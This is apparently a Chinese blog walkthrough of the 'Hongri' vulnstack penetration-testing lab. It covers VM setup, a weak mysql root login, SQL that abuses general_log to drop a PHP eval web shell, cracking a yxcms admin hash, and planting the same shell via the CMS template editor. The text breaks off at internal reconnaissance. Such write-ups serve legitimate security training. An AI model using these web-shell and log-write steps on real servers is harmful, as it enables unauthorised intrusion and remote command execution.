---
title: 实战 | 红日靶场一
url: https://mp.weixin.qq.com/s/8nWfHbtkz85oUh7SWABROw
source: Doonsec's feed
date: 2026-04-06
fetch_date: 2026-04-07T04:28:04.396869
---

# 实战 | 红日靶场一

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/bhDuGkpteXuFJKGicicQiaVAalQbHKfKvOyzpxzZliacHiaQeVEV9RVXibmbR4IkibJq0zS6n27a4HP0cUKxldnKNiaPuFpTrvjdpjUBpG6xxTR6bGk/0?wx_fmt=jpeg)

# 实战 | 红日靶场一

web安全小白
web安全小白

web安全小白

![]()

在小说阅读器中沉浸阅读

## 基本信息

下载地址：http://vulnstack.qiyuanxuetang.net/vuln/detail/2/

![](https://mmbiz.qpic.cn/sz_mmbiz_png/bhDuGkpteXsyNEnw9cvdvzibLRl77u7Nxv4hwWKJuxwG5J51MhOJDxiaibWufpxn64rsLrDZVzdOsJBia7TRnGGXWYaoDcaFRukBplniao1xaSpk/640?wx_fmt=png&from=appmsg)

IP信息

win7（边界主机）：192.168.52.143

win2k3（域用户）：192.168.52.141

2008R2（域控）：192.168.52.138

三台服务器密码：hongrisec@2019

## 环境配置

### 密码修改

三台服务器密码：hongrisec@2019

为顺利进行后续实验，需将密码进行统一修改：QWEasd123（修改的密码可以为任意）

### 网卡配置

点击 编辑----虚拟网络编辑器(N)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/bhDuGkpteXtzwyNicmFx5oXNu4QCuChicvbLXn1wVicU20X3ibib0BkicBwjlGZwBWXicvL4rjtqaYDl4icucVo8U1Q8CX0AhBxJm4ASaSLRPFwrX9I/640?wx_fmt=png&from=appmsg)

点击添加网络

![](https://mmbiz.qpic.cn/sz_mmbiz_png/bhDuGkpteXtAj0jXUHAYzFsIahjNukXE3bT5liawWyA5fhjIbAxic2rYo5iaS9hBaRr1oUvMdvqrOQkibEhO5lkEngBAUia9xNeWIDARCtuNEvvs/640?wx_fmt=png&from=appmsg)

点击确定

![](https://mmbiz.qpic.cn/sz_mmbiz_png/bhDuGkpteXuVa03QYoTXpIuarLekuAAjy5Fu2lwg92WObolTEfIxzLZ3vEMep1ib4OJYVkicWONdO6OagicvTskgKOIOKVTeqxVzBB17AqzuKs/640?wx_fmt=png&from=appmsg)

将子网IP设置为 192.168.52.0 后点击应用，接着点击确定即可

![](https://mmbiz.qpic.cn/sz_mmbiz_png/bhDuGkpteXtiaJq5gmhN3CUndALjzDWEWR6yiabgkHGRtEACeyEzvo95iawXQa9Sbib8tvF6CvxDFXOSG7hbd2juUyd0fa0ENfIuG3acPOspa7A/640?wx_fmt=png&from=appmsg)

将所有的服务器网络模式，都设置为刚刚创建的独立网卡

这里将Windows7 x64服务器多添加一张网卡，选择桥接模式

![](https://mmbiz.qpic.cn/mmbiz_png/bhDuGkpteXseDXOazWyLew09qONMThFwZUF8sb3rhSqhs7x0pL9CTiaGW17p1W544usdRqeF50KJibLHDYTGurGbtMSOUfszZMhX91iabCutu0/640?wx_fmt=png&from=appmsg)

### 服务启动

在C:\phpStudy\phpStudy.exe 目录下启动phpStudy.exe

![](https://mmbiz.qpic.cn/sz_mmbiz_png/bhDuGkpteXtXUZ3l8dMEqDF1cArxurP7ic3ghhNP1Ba2gdejMbNgEb5Y4Cj202QNydiaWE9Qn8zQBjsnIyYb7gp6Z2g4gzk7zrhLh9pot3spw/640?wx_fmt=png&from=appmsg)

查看当前ip，找到自己添加桥接模式后获取到的IP（我这里的是：192.168.2.226）

![](https://mmbiz.qpic.cn/sz_mmbiz_png/bhDuGkpteXunfKKEib4S6D904dmRBJAKR6q6hU61aBM9omlJiaAOOrQ92MEXhNd8AibPIMJuMemPpjofz8uD3ZNN9gt8Gf6hsc9afZ0ZaCWRHU/640?wx_fmt=png&from=appmsg)

访问对应ip（我这里的是：192.168.2.226）即可正常打靶

![](https://mmbiz.qpic.cn/mmbiz_png/bhDuGkpteXv4zLhX4koQgBDnR10dftrBDKeJjotujKHHLCbaSXBadSPjAk7icYjTBCE47E87urJTkyx1gjf0nXkLuMGrageibeStPABPWjJAY/640?wx_fmt=png&from=appmsg)

## 漏洞测试

### 外网渗透

#### 入口点一

访问目标时，可以直接看见phpstudy探针页面

![](https://mmbiz.qpic.cn/sz_mmbiz_png/bhDuGkpteXv1XCMeqN7gR1yYexVuqicqCrhDjmXtccku9OzT1LIwvjJkhwg4dENslOS18O7vuIPfOEQiajzkpEO66RoqgCAOtWfmBP8cXae38/640?wx_fmt=png&from=appmsg)

尝试mysql数据库密码弱口令

![](https://mmbiz.qpic.cn/sz_mmbiz_png/bhDuGkpteXvcD8qCbZrgAUs91n4YuynTZCh6ew7n13EhSibMCMkaQzzm2sBH8CT5MB1kC6OzibDmOlt2cjVrTdENuibsguzNB5CaXHuibHPKib9I/640?wx_fmt=png&from=appmsg)

很幸运的就能发现数据库的账号密码都为root

![](https://mmbiz.qpic.cn/sz_mmbiz_png/bhDuGkpteXsMLmEibnoXJia8fK0fiaUHrjsgYMjG161Ns66MRQlEXiaPtZwaNrhUfrRFROhXKpAHJULrnzhBV5cyQy0Ldk1bEX406J9BjyNaXxg/640?wx_fmt=png&from=appmsg)

尝试目录枚举，可以发现phpinfo，phpmyadmin以及备份页面

![](https://mmbiz.qpic.cn/sz_mmbiz_png/bhDuGkpteXs3nU0icSzBfGAuHb13KBwJWJ2de1M4YIBwbX0tKeZS7STzNn9VwfcQPHoibiafBHria6xGu5QwMB3Yeu4DPj6J3OhaiaENsrtWc6JI/640?wx_fmt=png&from=appmsg)

访问http://192.168.2.226/phpMyAdmin/页面，使用账号/密码 root进行登录

![](https://mmbiz.qpic.cn/sz_mmbiz_png/bhDuGkpteXsyTtOQtWwUcvUwJQOuu0KmNrrTKSKiaXJbYaehBN9SvC7nYstj7sKLGa3EoH1PgFkswhGAB7ibDtiafbMU02uvdAo44iad7dsSHdc/640?wx_fmt=png&from=appmsg)

**利用outfile文件写入**

**利用条件：**

1.gpc参数的状态为off

2.有绝对路径  /var/www/html

3.当前数据库用户的权限为root或拥有file权限

4.mysql的file\_priv参数不能为null （ mysql 5.6.34  以上的版本就默认为null）

**查看当前用户是否有写权限，Y代表有**

查询语句：select group\_concat(user,0x3a,file\_priv) from mysql.user

![](https://mmbiz.qpic.cn/sz_mmbiz_png/bhDuGkpteXswlic86pnDYMQOJHMUJ6FjRWSeDXvibJweVhicZQ2HGBj5Gxf2ialnfJI9TIzUuiaWtzq1YibajGx9lUic1KiczlBOSI4sd3eTuZmpJlo/640?wx_fmt=png&from=appmsg)

**判断是否能够写入文件**

查询语句：show variables like '%secure\_file\_priv%'

**null 无法写入和读取**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/bhDuGkpteXsicvgWib5eoQA4rsWXicQbHiaWnY1m8uw9c9LQrPyqUVPBjWM5viboHwgLEAtuviawkDB7XSaffGTBXl7wYVVZMZW76ka3uzOtSicpPI/640?wx_fmt=png&from=appmsg)

**基于general\_log日志写入**

利用条件

1.gpc参数的状态为off

2.有绝对路径

3.当前数据库用户的权限为root或拥有file权限

4.开启全局日志

开启对方的全局日志，将日志保存地址进行修改，然后我们查询数据，数据内容为木马

**利用流程**

查询全局日志存放路径

show variables like '%general%';

![](https://mmbiz.qpic.cn/sz_mmbiz_png/bhDuGkpteXtLPXHlKFibP9kzxGckpCFrafAK3ZecVBicOnQblOzcYTjvibZawiadVNkxD0G29CQAo5D6kuicC9BrrKL2zvgQUpm2tr8qC2MShI0A/640?wx_fmt=png&from=appmsg)

开启日志功能

set global general\_log = on;

![](https://mmbiz.qpic.cn/sz_mmbiz_png/bhDuGkpteXt4Rl8FVicYeTlsDqO7VfvC6qL8CdPdDql22eWH6LgXNuaxAqDkl1QX9rYUeGzks0SWl5aLeKlUSe82WHSMz6fWRZbsGljrsFYA/640?wx_fmt=png&from=appmsg)

修改日志存放地址

set global general\_log\_file = 'C:\phpstudy\_pro\WWW\Less-1\shell.php';

```
查询全局日志存放路径
show variables like '%general%';
C:\phpStudy\MySQL\data\stu1.log

开启全局日志
set global general_log = on;

C:\phpStudy\WWW\shell.php

日志保存地址修改
set global general_log_file = 'C:\\phpStudy\\WWW\\shell.php';

执行查询，使其信息写入日志
select "<?php eval($_POST['cmd']);?>";

修改为原来路径，再关闭全局日志
set global general_log_file='C:\\phpStudy\\MySQL\\data\\stu1.log';
set global general_log = off;

全部合在一起
set global general_log = on;set global general_log_file = 'C:\\phpStudy\\WWW\\shell.php';select "<?php eval($_POST['cmd']);?>";set global general_log_file='C:\\phpStudy\\MySQL\\data\\stu1.log';set global general_log = off;
```

连接后门：http://192.168.2.226/shell.php

![](https://mmbiz.qpic.cn/mmbiz_png/bhDuGkpteXsELZw55gE53EGAMoeuoTdYGe9AIR094XTXEKVdeogrLu6VpdiaynSTA8udYeoZCfw2umcAyRGBhGMlotGUIAZ5OciaiaNcrSTII4/640?wx_fmt=png&from=appmsg)

#### 入口点二

登陆后可以发现存在yxcms数据库

![](https://mmbiz.qpic.cn/mmbiz_png/bhDuGkpteXtNDsZUhxCPfzw75kIcgG0ylGp29A7TylaeR5CahWu4R0lu6v1lic0ovt8rfVFzLfXh0LEwZTwYlj7ORibj9grmCm64Z2wlRullg/640?wx_fmt=png&from=appmsg)

找到与用户相关的数据库表，可以发现admin用户的密码168a73655bfecefdb15b14984dd2ad60

![](https://mmbiz.qpic.cn/sz_mmbiz_png/bhDuGkpteXuX8HrkDcEpkC3AxGqOzYymlh2MN9pwe54XhRJXrnwsxBE7V16vRZcPMyyc6YS6cNK533iaYT6Jxj8I3icJ7ibF7X4K16W1q1pssI/640?wx_fmt=png&from=appmsg)

https://www.cmd5.com/ 尝试解密，可知密码为123456

![](https://mmbiz.qpic.cn/sz_mmbiz_png/bhDuGkpteXuleBpD4K4XLs0a37onyOrWZ4iaiaekHtoNvH2P6LZCI9jQaaj1G9xTLcPEAxt3WnGHdyQsx1A8w0aZ0TL84Noz6tLeAhjx5PyRg/640?wx_fmt=png&from=appmsg)

因最初进行目录扫描时没有探测出后台，故而猜测yxcms是目录建站或端口建站。

尝试访问目录/yxcms可以发现存在网站，所以可知对方采用的是目录建站

![](https://mmbiz.qpic.cn/mmbiz_png/bhDuGkpteXvAibSa209RV2TibQd83YQ9qVnckVwoibL1RWb9E5Rqnc5s4eibGWt6HPnz74Hh2vmFF4wAsYNqa80G1BXsgh4N8JibuQBbc1nuvhX4/640?wx_fmt=png&from=appmsg)

因知道网站指纹，所以我们可以根据网上公开信息，访问对应源码的后台

![](https://mmbiz.qpic.cn/sz_mmbiz_png/bhDuGkpteXs9xT0YnVPaWWaA0Zia2N4OqCEagH9SOElgcEpiaNToxSkwH3kOUibDTsbZ64EqMg3eZWOaGK2Lb56Z0iadKytrlyNlSMXuiam7WAU4/640?wx_fmt=png&from=appmsg)

使用数据库获取的账号admin 密码 123456 进行登录

![](https://mmbiz.qpic.cn/mmbiz_png/bhDuGkpteXuxUCtbzMK44jwhPoNXld805nTnafJXibDFtibSvy4hlKibkGWHkveRxd5PFcgQUkrD3KTgeuIXWKvE5GvRgFFgUoe2Acslbe5buM/640?wx_fmt=png&from=appmsg)

因为存在指纹的，实战中直接参考网上爆出的后台getshell方法，进行复现即可

![](https://mmbiz.qpic.cn/sz_mmbiz_png/bhDuGkpteXvrSCjhcR8Z54DfwE3dCyUAhUvQDIpXYkKGALZ2J7pRNACxxnIyoHZhZ05zclrOar5FEZwcVd3kczXYfStWEDV25kBM5oW0olU/640?wx_fmt=png&from=appmsg)

插入木马，并点击创建

```
<?php eval($_POST['cmd']);?>
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/bhDuGkpteXvE3hTBvQxf9MsQ14oNxbjN0kdkZqqz0ZTDWBhtJfkRibmnU5ug3TOcBPbzVq3ON9xia538Kp1BmpgIOfZcSItP4TeeKMmJibewBc/640?wx_fmt=png&from=appmsg)

连接后门：http://192.168.2.226/yxcms/protected/apps/default/view/default/test.php

![](https://mmbiz.qpic.cn/sz_mmbiz_png/bhDuGkpteXuqXTWrjbzHxgO5PGRaGMbSjR09E9dGec8YuDRCHZWBLQ8xVPhdKCf2o3JuEq43ibVecQo4wvIzCBjcO2xu62rEZ9ib6VohNczHI/640?wx_fmt=png&from=appmsg)

### 内网渗透

#### 内网信息收集

查看系统进程：tasklist

![](https://mmbiz.qpic.cn/sz_mmbiz_png/bhDuGkpteXud8ibojJkKJCqBttLPHjfVzIqicZIKBLqyGwMlMJkbcuibrWo2F2BTfZJ3o3afU9KOFY9I1zk4xl5cToJFPSHz3Ld9reAbo9zZzs/640?wx_fmt=png&from=appmsg)

通过进程信息可知对方并没有开启任何杀软

![](https://mmbiz.qpic.cn/sz_...